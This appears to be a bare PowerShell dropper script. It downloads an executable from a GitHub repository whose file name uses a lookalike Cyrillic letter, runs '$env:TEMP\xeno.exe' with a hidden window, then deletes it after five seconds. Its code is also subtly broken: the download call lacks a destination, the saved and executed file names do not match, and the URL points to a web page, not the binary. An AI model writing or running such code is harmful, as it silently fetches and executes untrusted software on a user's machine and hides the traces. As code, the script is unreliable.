$client = New-Object System.Net.WebClient
$client.DownloadFile("https://github.com/valer870810-maker/xenofiles/blob/main/а.exe")
Start-Process "$env:TEMP\xeno.exe" -WindowStyle Hidden
Start-Sleep -Seconds 5
Remove-Item "$env:TEMP\xeno.exe"
